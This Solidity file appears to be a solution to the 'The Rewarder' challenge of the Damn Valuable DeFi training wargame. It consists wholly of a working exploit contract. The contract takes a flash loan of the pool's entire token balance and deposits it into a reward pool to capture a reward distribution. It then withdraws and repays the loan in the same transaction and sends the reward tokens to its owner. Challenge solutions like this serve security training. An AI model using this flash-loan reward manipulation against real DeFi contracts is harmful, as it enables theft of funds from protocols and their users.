// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";

contract TheRewarderExploit {

    FlashLoanerPool public immutable flashloan;
    TheRewarderPool public immutable rewarderPool;
    DamnValuableToken public immutable liquidityToken;    
    RewardToken public immutable rewardToken;

    address owner;

    constructor(address flashloanAddress, address rewarderAddress, address liquidityTokenAddress, address rewardTokenAddress) {
        owner = msg.sender;
        flashloan = FlashLoanerPool(flashloanAddress);
        rewarderPool = TheRewarderPool(rewarderAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function exploit() public {
        require(owner == msg.sender);
        flashloan.flashLoan(liquidityToken.balanceOf(address(flashloan)));
    }

    function receiveFlashLoan(uint256 amount) public {
        require(msg.sender == address(flashloan));

        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);

        liquidityToken.transfer(address(flashloan), amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}